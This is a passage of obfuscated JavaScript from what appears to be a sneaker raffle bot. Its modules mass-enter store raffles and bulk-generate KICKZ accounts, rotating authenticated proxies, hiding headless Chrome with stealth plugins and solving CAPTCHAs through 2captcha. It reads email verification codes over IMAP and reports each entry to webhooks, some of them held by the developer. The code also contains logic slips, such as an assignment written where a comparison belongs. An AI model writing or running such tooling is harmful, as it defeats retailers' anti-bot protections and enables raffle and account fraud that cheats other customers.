                    _0xf5e41e(_0x1e0f7e['name'] + '\x20Task\x20' + (_0x43b7ce + 0x1) + '\x20/\x20' + _0x1be88b['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869);
                    try {
                        await _0x436f00(_0x1be88b, _0x43b7ce);
                    } catch {
                        _0x409076 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x48742e = await _0x1523c9(_0x1be88b[_0x43b7ce], _0x1e0f7e, 'dev', ![]), _0x4b288b = await _0x1523c9(_0x1be88b[_0x43b7ce], _0x1e0f7e, 'pub', ![]);
                    const _0x42ead3 = {
                        'succesDEVMSG': { 'embeds': [_0x48742e] },
                        'succesPUBMSG': { 'embeds': [_0x4b288b] }
                    };
                    if (_0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '')
                        try {
                            await _0xb6cfae(_0x255a87['webhook'], _0x42ead3['succesDEVMSG']);
                        } catch {
                        }
                    await _0x4fda60(0xc8), await _0xb6cfae(_0x4fb406, _0x42ead3['succesDEVMSG']), await _0x4fda60(0xc8);
                    try {
                        await _0xb6cfae(_0x5d80c9, _0x42ead3['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x1be88b[_0x43b7ce]['Email'] == '' || _0x1be88b[_0x43b7ce]['Url'] == '' || _0x1be88b[_0x43b7ce]['FirstName'] == '' || _0x1be88b[_0x43b7ce]['LastName'] == '') {
                        console['log'](_0x46dcc5() + '\x20[' + _0x365670[taskModule]['name'] + ']\x20Task\x20' + (_0x43b7ce + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x255a87['useRandomProxy'] = ![])
                        var _0x29f503 = _0x1c041f[_0x43b7ce]['split'](':');
                    else
                        var _0x395a01 = Math['round'](Math['random']() * (_0x1c041f['length'] - 0x1)), _0x29f503 = _0x1c041f[_0x395a01]['split'](':');
                    var _0x163c73;
                    try {
                        _0x163c73 = await _0x510708['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x29f503[0x0] + ':' + _0x29f503[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x163c73 = await _0x510708['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x29f503[0x0] + ':' + _0x29f503[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x5b4d83 = await _0x163c73['newPage']();
                        await _0x5b4d83['authenticate']({
                            'username': '' + _0x29f503[0x2],
                            'password': '' + _0x29f503[0x3]
                        }), console['log'](_0x46dcc5() + '\x20[' + _0x1e0f7e['name'] + ']\x20Task\x20' + (_0x43b7ce + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5b4d83['setRequestInterception'](!![]), _0x5b4d83['on']('request', _0x50242c => {
                            _0x50242c['resourceType']() === 'image' || _0x50242c['resourceType']() === 'font' || _0x50242c['resourceType']() === 'media' ? _0x50242c['abort']() : _0x50242c['continue']();
                        });
                        try {
                            await _0x5b4d83['goto']('' + _0x1be88b[_0x43b7ce]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x5b4d83['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x46dcc5() + '\x20[' + _0x1e0f7e['name'] + ']\x20Task\x20' + (_0x43b7ce + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5b4d83['type']('#comp_firstname', '' + _0x1be88b[_0x43b7ce]['FirstName']), await _0x5b4d83['waitForSelector']('#comp_lastname'), await _0x5b4d83['type']('#comp_lastname', '' + _0x1be88b[_0x43b7ce]['LastName']), await _0x5b4d83['waitForSelector']('#comp_email'), await _0x5b4d83['type']('#comp_email', '' + _0x1be88b[_0x43b7ce]['Email']), await _0x5b4d83['waitForSelector']('#comp_paypalemail'), await _0x5b4d83['type']('#comp_paypalemail', '' + _0x1be88b[_0x43b7ce]['Email']), await _0x5b4d83['waitForSelector']('#comp_mobile_end'), await _0x5b4d83['type']('#comp_mobile_end', '' + _0x1be88b[_0x43b7ce]['Phone']), await _0x5b4d83['waitForSelector']('#comp_dob'), await _0x5b4d83['type']('#comp_dob', '08/09/1992'), console['log'](_0x46dcc5() + '\x20[' + _0x1e0f7e['name'] + ']\x20Task\x20' + (_0x43b7ce + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x1be88b[_0x43b7ce]['Size'] == 'RANDOM') {
                            const _0x3fe15d = await _0x5b4d83['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x5a6f19 => {
                                return _0x5a6f19['map'](_0x41c098 => _0x41c098['value']);
                            });
                            var _0x3d3305 = Math['round'](Math['random']() * (_0x3fe15d['length'] - 0x2));
                            await _0x5b4d83['select']('#shoesize', _0x3fe15d[_0x3d3305 + 0x1]), await _0x4fda60(0x3e8);
                        } else {
                            const _0x528d50 = await _0x5b4d83['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x5d7360 => {
                                return _0x5d7360['map'](_0x3b8886 => _0x3b8886['innerText']);
                            }), _0x370bae = await _0x5b4d83['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3e2ca5 => {
                                return _0x3e2ca5['map'](_0x115493 => _0x115493['value']);
                            });
                            var _0x486f5a = _0x1be88b[_0x43b7ce]['Size'];
                            for (var _0x14d96e = 0x1; _0x14d96e < _0x370bae['length']; _0x14d96e++) {
                                var _0x3291ab = _0x528d50[_0x14d96e]['split']('\x20')[0x0];
                                if (_0x3291ab == _0x486f5a) {
                                    await _0x5b4d83['select']('#shoesize', _0x370bae[_0x14d96e]);
                                    break;
                                } else {
                                    if (_0x14d96e + 0x1 == _0x370bae['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x5b4d83['waitForSelector']('#comp_address1'), await _0x5b4d83['type']('#comp_address1', _0x1be88b[_0x43b7ce]['Address1'] + '\x20' + _0x1be88b[_0x43b7ce]['HouseNumber']), await _0x5b4d83['waitForSelector']('#comp_address2'), await _0x5b4d83['type']('#comp_address2', '' + _0x1be88b[_0x43b7ce]['Address2']), await _0x5b4d83['waitForSelector']('#comp_address2'), await _0x5b4d83['type']('#comp_address3', '' + _0x1be88b[_0x43b7ce]['City']), await _0x5b4d83['waitForSelector']('#comp_postcode'), await _0x5b4d83['type']('#comp_postcode', '' + _0x1be88b[_0x43b7ce]['Zip']), console['log'](_0x46dcc5() + '\x20[' + _0x1e0f7e['name'] + ']\x20Task\x20' + (_0x43b7ce + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x4fda60(0x4b0), await _0x5b4d83['click']('label#emailhold'), await _0x4fda60(0x5dc), await _0x5b4d83['click']('#preauth_tandc_email\x20>\x20label'), await _0x4fda60(0x5dc), await _0x5b4d83['click']('#submit');
                        try {
                            await _0x5b4d83['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x46dcc5() + '\x20[' + _0x1e0f7e['name'] + ']\x20Task\x20' + (_0x43b7ce + 0x1) + '\x20:\x20' + _0x3e3bb6['blue']('Awaiting\x20Paypal\x20Payment')), _0x163c73['on']('targetcreated', async _0x444738 => {
                            if (_0x444738['type']() === 'page') {
                                const _0x4c093a = await _0x444738['page']();
                                async function _0x3ba249() {
                                    try {
                                        await _0x5b4d83['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x214190 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x50fb8d() {
                                    try {
                                        await _0x5b4d83['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x3fc517 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x50fb8d(), _0x3ba249(), await _0x4fda60(0x493e0);
                            }
                        });
                        async function _0x46eb96() {
                            for (let _0x432797 = 0x0; _0x432797 < 0x12c; _0x432797++) {
                                if (_0x3fc517 == !![]) {
                                    _0x409076 = 'no', _0x8bf342(_0x1be88b[_0x43b7ce], _0x1e0f7e), console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x1e0f7e['name'] + ']\x20Task\x20' + (_0x43b7ce + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '')
                                        try {
                                            await _0xb6cfae(_0x255a87['webhook'], _0x42ead3['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x4fda60(0xc8), await _0xb6cfae(_0x4fb406, _0x42ead3['succesDEVMSG']), await _0x4fda60(0xc8);
                                    try {
                                        await _0xb6cfae(_0x5d80c9, _0x42ead3['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x214190)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x4fda60(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x4fda60(0xbb8), await _0x5b4d83['click']('.zoid-outlet'), await _0x4fda60(0x7d0), await _0x46eb96();
                    } catch (_0x5259be) {
                        console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x1e0f7e['name'] + ']\x20Task\x20' + (_0x43b7ce + 0x1) + '\x20:\x20' + _0x5259be)), _0x326315 = '' + _0x5259be;
                        var _0x22b9fe = await _0x1523c9(_0x1be88b[_0x43b7ce], _0x1e0f7e, 'dev', !![], _0x326315);
                        _0x42ead3['errorDEV'] = { 'embeds': [_0x22b9fe] }, _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x42ead3['errorDEV']), await _0xb6cfae(_0x991bd5, _0x42ead3['errorDEV']);
                    } finally {
                        _0x163c73 && _0x163c73['close']();
                        if (_0x409076 == 'yes' && _0x5b527e != 0x5 && _0x326315 != 'Size\x20Not\x20Found') {
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x1e0f7e['name'] + ']\x20Task\x20' + (_0x43b7ce + 0x1) + '\x20:\x20Retrying\x20(' + _0x5b527e + '\x20/\x205)')), _0x43b7ce = _0x43b7ce - 0x1, _0x5b527e = _0x5b527e + 0x1;
                            continue;
                        }
                        _0x409076 == 'yes' && _0x5b527e >= 0x5 && (_0x2540d5(afew[_0x43b7ce], _0x1e0f7e), _0x409076 = 'no', _0x5b527e = 0x0), console['log']('Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x14b4ba, _0x111d66, _0x19b797) {
                    _0x510708['use'](_0x4fd89e()), _0x510708['use'](_0x3b4fcd({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x255a87['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xe916cd = 0x0; _0xe916cd < _0x111d66['length']; _0xe916cd++) {
                        const _0x964515 = 'https://www.kickz.com/login';
                        if (_0x16b0ff != 'yes')
                            var _0x16b0ff = '', _0x24671d = 0x0;
                        _0xf5e41e(_0x14b4ba['name'] + '\x20Task\x20' + (_0xe916cd + 0x1) + '\x20/\x20' + _0x111d66['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869);
                        try {
                            await _0x436f00(_0x111d66, _0xe916cd);
                        } catch {
                            _0x16b0ff = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x2264cd = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x26c985
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x255a87['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1ad228
                                }
                            ]
                        }];
                        const _0x3bbb77 = { 'embeds': _0x2264cd };
                        var _0xb68472 = await _0x1523c9(_0x111d66[_0xe916cd], _0x14b4ba, 'acc', ![]);
                        const _0x568908 = { 'succesDEVMSG': { 'embeds': [_0xb68472] } };
                        if (_0x111d66[_0xe916cd]['Email'] == '' || _0x111d66[_0xe916cd]['FirstName'] == '' || _0x111d66[_0xe916cd]['LastName'] == '') {
                            console['log'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x111d66[_0xe916cd]['Password'] == '' && (_0x111d66[_0xe916cd]['Password'] = 'JRaffles23!');
                        if (_0x255a87['useRandomProxy'] = ![])
                            var _0x1af685 = _0x19b797[_0xe916cd]['split'](':');
                        else
                            var _0x1b3907 = Math['round'](Math['random']() * (_0x19b797['length'] - 0x1)), _0x1af685 = _0x19b797[_0x1b3907]['split'](':');
                        var _0x3c6d33;
                        try {
                            _0x3c6d33 = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1af685[0x0] + ':' + _0x1af685[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3c6d33 = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1af685[0x0] + ':' + _0x1af685[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2a2fe0 = await _0x3c6d33['newPage']();
                            await _0x2a2fe0['authenticate']({
                                'username': '' + _0x1af685[0x2],
                                'password': '' + _0x1af685[0x3]
                            }), console['log'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2a2fe0['setRequestInterception'](!![]), _0x2a2fe0['on']('request', _0x117563 => {
                                _0x117563['resourceType']() === 'image' || _0x117563['resourceType']() === 'font' || _0x117563['resourceType']() === 'media' ? _0x117563['abort']() : _0x117563['continue']();
                            }), await _0x2a2fe0['goto'](_0x964515), await _0x4fda60(0xbb8), console['log'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x2a2fe0['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2a2fe0['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2a2fe0['waitForSelector']('#button-register'), await _0x4fda60(0x7d0), await _0x2a2fe0['evaluate'](() => {
                                const _0x3eb09c = document['querySelector']('#button-register');
                                _0x3eb09c['click']();
                            }), console['log'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x4fda60(0x1388), await _0x2a2fe0['waitForSelector']('#customer_salutation'), await _0x2a2fe0['select']('#customer_salutation', 'mr'), await _0x4fda60(0x7d0), await _0x2a2fe0['waitForSelector']('#customer_firstname'), await _0x2a2fe0['type']('#customer_firstname', '' + _0x111d66[_0xe916cd]['FirstName']), await _0x4fda60(0x352), await _0x2a2fe0['waitForSelector']('#customer_lastname'), await _0x2a2fe0['type']('#customer_lastname', '' + _0x111d66[_0xe916cd]['LastName']), await _0x4fda60(0x352), await _0x2a2fe0['type']('#email-input', '' + _0x111d66[_0xe916cd]['Email']), await _0x4fda60(0x352), await _0x2a2fe0['type']('#email-confirm-input', '' + _0x111d66[_0xe916cd]['Email']), await _0x4fda60(0x352), await _0x2a2fe0['type']('#register-password', '' + _0x111d66[_0xe916cd]['Password']), await _0x4fda60(0x352), await _0x2a2fe0['type']('#password-confirm', '' + _0x111d66[_0xe916cd]['Password']), await _0x4fda60(0x352), console['log'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x2a2fe0['click']('#consent'), await _0x4fda60(0x1f4);
                            const _0x9d92ce = await _0x2a2fe0['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x9d92ce) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x2a2fe0['click']('#buttonRegister');
                            try {
                                await _0x2a2fe0['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x111d66[_0xe916cd]['Email']), await _0x4fda60(0x4b0);
                            async function _0x50632f() {
                                var _0x552e7f, _0x12c8a3 = ![];
                                for (var _0x3e66d8 = 0x0; _0x3e66d8 < 0x18; _0x3e66d8++) {
                                    async function _0x246c39() {
                                        var _0x554a96 = new _0x4ce16c({
                                            'user': _0x255a87['masterMail'],
                                            'password': _0x255a87['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x1f264d(_0x5a8ce9) {
                                            _0x554a96['openBox']('INBOX', ![], _0x5a8ce9);
                                        }
                                        _0x554a96['once']('ready', function () {
                                            console['log'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x1f264d(function (_0x38c308, _0x8b94bf) {
                                                console['log'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x38c308)
                                                    throw _0x38c308;
                                                _0x554a96['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x125b15, _0x55fa0f) {
                                                    if (!_0x55fa0f || !_0x55fa0f['length'])
                                                        console['log'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x554a96['end']();
                                                    else {
                                                        var _0x4cf5bc = _0x554a96['seq']['fetch'](_0x55fa0f, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x4cf5bc['on']('message', function (_0x7ae1e7, _0x5c617c) {
                                                            var _0x4a4216 = '(#' + _0x5c617c + ')\x20';
                                                            _0x7ae1e7['on']('body', function (_0x34f09f, _0x175a3a) {
                                                                _0x425966(_0x34f09f, (_0x5e15fb, _0x1a0262) => {
                                                                    if (_0x1a0262['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x30e2af = _0x1a0262['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0xcff7fa = _0x30e2af[0x1]['split']('<')[0x0];
                                                                        _0x552e7f = _0xcff7fa;
                                                                    }
                                                                });
                                                            }), _0x7ae1e7['once']('end', function () {
                                                            });
                                                        }), _0x4cf5bc['once']('error', function (_0x2b0736) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x4cf5bc['once']('end', function () {
                                                            _0x554a96['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x554a96['once']('error', function (_0x8f5f27) {
                                            console['log'](_0x3e3bb6['red'](_0x8f5f27['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x12c8a3 = !![];
                                        }), _0x554a96['once']('end', async function () {
                                        }), _0x554a96['connect']();
                                    }
                                    _0x246c39(), await _0x4fda60(0x1388);
                                    if (_0x552e7f)
                                        return _0x552e7f;
                                    if (_0x12c8a3)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x3e66d8 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x50632f(), _0x4fda60(0x320), console['log'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20Verifying..'), await _0x2a2fe0['type']('#verificationCode', code), await _0x4fda60(0x1f4), await _0x2a2fe0['click']('#buttonVerify'), await _0x4fda60(0x190), await _0x2a2fe0['click']('#buttonVerify'), await _0x4fda60(0x3e8);
                            try {
                                await _0x2a2fe0['waitForSelector']('div.b-user_greeting'), _0x16b0ff = 'no', console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20Account\x20' + _0x111d66[_0xe916cd]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x147d24['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x111d66[_0xe916cd]['Email'] + ',' + _0x111d66[_0xe916cd]['Password'] + ','), console['log'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20Account\x20' + _0x111d66[_0xe916cd]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x568908['succesDEVMSG']);
                                } catch {
                                }
                                await _0xb6cfae(_0xc2690c, _0x568908['succesDEVMSG']);
                            } catch {
                                _0x16b0ff = 'no', console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x504549) {
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20' + _0x504549)), _0x2264cd[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x2264cd[0x0]['description'] = '' + _0x504549, await _0xb6cfae(_0x991bd5, _0x3bbb77), _0x16b0ff = 'yes';
                        } finally {
                            _0x3c6d33 && _0x3c6d33['close']();
                            if (_0x16b0ff == 'yes' && _0x24671d != 0x5) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x14b4ba['name'] + ']\x20Task\x20' + (_0xe916cd + 0x1) + '\x20:\x20Retrying\x20(' + _0x24671d + '\x20/\x205)')), _0xe916cd = _0xe916cd - 0x1, _0x24671d = _0x24671d + 0x1;
                                continue;
                            }
                            _0x16b0ff == 'yes' && _0x24671d >= 0x5 && (_0x2540d5(_0x111d66[_0xe916cd], _0x14b4ba), _0x16b0ff = 'no', _0x24671d = 0x0), console['log']('Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x466a1c, _0x67626e, _0x392414) {
                    _0x510708['use'](_0x4fd89e()), _0x510708['use'](_0x3b4fcd({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x255a87['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4d48b5 = 0x0; _0x4d48b5 < _0x67626e['length']; _0x4d48b5++) {
                        var _0x41ea98;
                        if (_0x397afa != 'yes')
                            var _0x397afa = '', _0x96c5b6 = 0x0;
                        _0xf5e41e(_0x466a1c['name'] + '\x20Task\x20' + (_0x4d48b5 + 0x1) + '\x20/\x20' + _0x67626e['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869);
                        var _0x15475f = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x26c985
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x67626e[_0x4d48b5]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x67626e[_0x4d48b5]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x255a87['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1ad228
                                }
                            ]
                        }];
                        let _0x5100f5 = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0x238a08 = ![];
                        for (key of _0x5100f5) {
                            if (_0x67626e[_0x4d48b5][key] == '' || !_0x67626e[_0x4d48b5][key]) {
                                console['log'](_0x46dcc5() + '\x20[' + _0x466a1c['name'] + ']\x20Task\x20' + (_0x4d48b5 + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0x238a08 = !![];
                                break;
                            }
                        }
                        if (_0x238a08) {
                            await _0x4fda60(0x1f4);
                            continue;
                        }
                        var _0x1a0d7c = await _0x1523c9(_0x67626e[_0x4d48b5], _0x466a1c, 'dev', ![]), _0x4e4b84 = await _0x1523c9(_0x67626e[_0x4d48b5], _0x466a1c, 'pub', ![]);
                        const _0x5db231 = {
                            'succesDEVMSG': { 'embeds': [_0x1a0d7c] },
                            'succesPUBMSG': { 'embeds': [_0x4e4b84] }
                        };
                        try {
                            await _0x436f00(_0x67626e, _0x4d48b5);
                        } catch {
                            _0x397afa = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x255a87['useRandomProxy'] = ![])
                            var _0x1dbae5 = _0x392414[_0x4d48b5]['split'](':');
                        else
                            var _0x357aa2 = Math['round'](Math['random']() * (_0x392414['length'] - 0x1)), _0x1dbae5 = _0x392414[_0x357aa2]['split'](':');
                        var _0x21e9bb;
                        try {
                            _0x21e9bb = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x1dbae5[0x0] + ':' + _0x1dbae5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x21e9bb = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x1dbae5[0x0] + ':' + _0x1dbae5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2f472f = await _0x21e9bb['newPage']();
                            await _0x2f472f['authenticate']({
                                'username': '' + _0x1dbae5[0x2],
                                'password': '' + _0x1dbae5[0x3]
                            }), console['log'](_0x46dcc5() + '\x20[' + _0x466a1c['name'] + ']\x20Task\x20' + (_0x4d48b5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2f472f['setRequestInterception'](!![]), _0x2f472f['on']('request', _0x3aa8a5 => {
                                _0x3aa8a5['resourceType']() === 'image' || _0x3aa8a5['resourceType']() === 'font' || _0x3aa8a5['resourceType']() === 'media' ? _0x3aa8a5['abort']() : _0x3aa8a5['continue']();
